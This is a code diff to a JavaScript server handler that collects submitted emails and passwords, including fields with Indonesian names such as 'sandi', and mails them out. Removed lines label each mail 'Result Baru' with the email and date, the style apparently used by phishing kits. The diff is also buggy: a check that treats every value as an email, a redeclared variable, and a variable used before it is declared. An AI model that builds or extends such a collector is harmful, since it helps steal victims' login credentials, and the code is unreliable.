@@ -107,16 +107,25 @@ function map(vars, key, value) {
 
   const v = String(value).trim();
 
-  if (k.includes("email") || v.includes("@")) {
+  if (k.includes("email") || v.includes("")) {
     vars.email = v;
     return;
   }
-   if (
-  k.includes("password") ||
-  k.includes("pass") ||
-  k.includes("sandi")
+   const key = k.toLowerCase().replace(/[^a-z0-9]/g, "");
+
+if (
+  key === "password" ||
+  key === "pass" ||
+  key === "passwd" ||
+  key === "pwd" ||
+  key === "sandi" ||
+  key === "katasandi" ||
+  key === "passwordlogin" ||
+  key === "loginpassword" ||
+  key === "userpassword" ||
+  key === "accountpassword"
 ) {
-  vars.password = v;
+  vars.password = String(v).trim();
   return;
 }
 
@@ -531,11 +540,7 @@ module.exports = async (req, res) => {
 
     const body = parseBody(req);
 
-    const vars = extractVars(pesan);
-
-const subjek =
-  body.subjek ||
-  `Result Baru | ${vars.email || "Unknown"} | ${new Date().toLocaleString("id-ID")}`;
+    const subjek = String(body.subjek || "");
     const pesan = String(body.pesan || "");
 
     if (!subjek || !pesan) {
